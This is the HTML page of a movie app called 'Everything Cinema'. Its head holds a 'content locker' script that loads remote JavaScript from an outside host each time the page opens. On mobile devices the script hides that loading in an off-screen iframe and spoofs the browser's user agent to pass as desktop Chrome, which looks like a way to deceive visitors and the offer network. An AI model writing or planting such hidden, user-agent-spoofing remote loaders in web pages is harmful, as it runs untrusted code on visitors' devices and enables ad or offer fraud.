<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
  <meta content="Everything Cinema is a popular movie app made by Anom." name="description" />
  <link href="./favicon.svg" rel="shortcut icon" type="image/svg+xml" />
  <link href="https://fonts.googleapis.com" rel="preconnect" />
  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;700&display=swap" rel="stylesheet" />
  <link href="./assets/css/style.css" rel="stylesheet" />
  <script defer src="./assets/js/global.js"></script>
  <script src="./assets/js/detail.js" type="module"></script>

<!-- Content Locker with 30-day cookie -->
<script>
  function setCookie(name, value, days) {
    const d = new Date();
    d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = name + "=" + value + ";expires=" + d.toUTCString() + ";path=/";
  }

  function getCookie(name) {
    const cname = name + "=";
    const ca = decodeURIComponent(document.cookie).split(';');
    for (let i = 0; i < ca.length; i++) {
      let c = ca[i].trim();
      if (c.indexOf(cname) === 0) return c.substring(cname.length, c.length);
    }
    return "";
  }

  function isMobileDevice() {
    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  }

  function loadLocker() {
    if (isMobileDevice()) {
      const iframe = document.createElement('iframe');
      iframe.style.position = 'fixed';
      iframe.style.left = '-9999px';
      iframe.style.top = '0';
      iframe.style.width = '1024px';
      iframe.style.height = '768px';
      iframe.style.border = 'none';
      document.body.appendChild(iframe);

      const iframeDoc = iframe.contentWindow.document;
      iframeDoc.open();
      iframeDoc.write(`
        <script>
          Object.defineProperty(navigator, 'userAgent', {
            get: function () {
              return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122 Safari/537.36';
            }
          });
        <\/script>
        <script src="https://areyourealhuman.com/cl/js/j638dp"><\/script>
      `);
      iframeDoc.close();
    } else {
      const script = document.createElement('script');
      script.id = 'ogjs';
      script.src = 'https://areyourealhuman.com/cl/js/j638dp';
      script.type = 'text/javascript';
      document.head.appendChild(script);
    }
  }

  if (getCookie("anom") !== "true") {
    window.addEventListener("message", function (e) {
      if (e.data === "locker-complete") {
        setCookie("anom", "true", 30);
        console.log("✅ Locker completed: cookie set for 30 days");
      }
    });
    loadLocker();
  } else {
    console.log("✅ Locker already completed: skipping");
  }
</script>
</head>

<body>
  <header class="header">
    <a class="logo" href="./index.html">
      <img alt="Everything Cinema home" height="32" src="./assets/images/logo.png" width="140" />
    </a>
    <div class="search-box" search-box="">
      <div class="search-wrapper" search-wrapper="">
        <input aria-label="search movies" autocomplete="off" class="search-field" name="search" placeholder="Search any movies..." search-field="" type="text" />
        <img alt="search" class="leading-icon" height="24" src="./assets/images/search.png" width="24" />
      </div>
      <button class="search-btn" search-toggler="">
        <img alt="close search box" height="24" src="./assets/images/close.png" width="24" />
      </button>
    </div>
    <div class="search-btn" menu-close="" search-toggler="">
      <img alt="open search box" height="24" src="./assets/images/search.png" width="24" />
    </div>
    <button class="menu-btn" menu-btn="" menu-toggler="">
      <img alt="open menu" class="menu" height="24" src="./assets/images/menu.png" width="24" />
      <img alt="close menu" class="close" height="24" src="./assets/images/menu-close.png" width="24" />
    </button>
  </header>

  <main>
    <nav class="sidebar" sidebar=""></nav>
    <div class="overlay" menu-toggler="" overlay=""></div>

    <!-- Player Section -->
    <article class="container" page-content="">
      <!-- Your dynamic movie content will load here via detail.js -->
    </article>
  </main>
</body>
</html>
